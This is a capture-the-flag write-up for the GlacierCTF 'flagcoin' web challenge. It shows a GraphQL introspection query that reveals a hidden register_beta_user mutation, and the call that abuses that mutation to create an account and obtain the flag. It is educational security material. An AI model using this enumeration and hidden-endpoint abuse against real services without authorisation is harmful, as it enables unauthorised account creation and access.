# Challenge

Our new 110% legit cryptocurrency is so cool, it does not even use blockchains. We have a WIP web interface for trading though. Hope nobody can get a beta testing account.

https://flagcoin.ctf.glacierctf.com

# Writeup

There is a graphql query endpoint:

```js
const graphql = async (query, variables) => {
  let res = await fetch("/graphql", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ query, variables })
  });
  return await res.json();
};

const login = async () => {
  let username = $("input[name=user]").value;
  let password = $("input[name=pass]").value;
  let res = await graphql(`
      mutation($username: String!, $password: String!) { 
        login(username: $username, password: $password) { 
          username 
        } 
      }
      `, {
    username,
    password
  });

  if (res.errors) {
    alert('login error ' + res.errors[0].message);
  } else {
    location.href = '/panel';
  }
};
```

We can leverage the GraphQL schema to find all mutations available (learned from https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/):

```graphql
query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

In the schema, we can see that there is a mutation called `register_beta_user`:

```json
{
    "name": "register_beta_user",
    "description": null,
    "args": [
        {
            "name": "username",
            "description": null,
            "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
            },
            "defaultValue": null
        },
        {
            "name": "password",
            "description": null,
            "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
            },
            "defaultValue": null
        }
    ],
    "type": {
        "kind": "OBJECT",
        "name": "User",
        "ofType": null
    },
    "isDeprecated": false,
    "deprecationReason": null
},
```

We can register a beta user via the mutation:

```js
graphql("mutation($username: String!, $password: String!) {register_beta_user(username: $username, password: $password) { username }}", {username: 'beta1234', password: 'beta1234'}).await
```

We can login to the account and capture the flag `glacierctf{bUy_Th3_d1P_br0h}`.

# Conclusion

GraphQL has its introspection ability, which is useful for development, but can be leveraged by the attacker as well.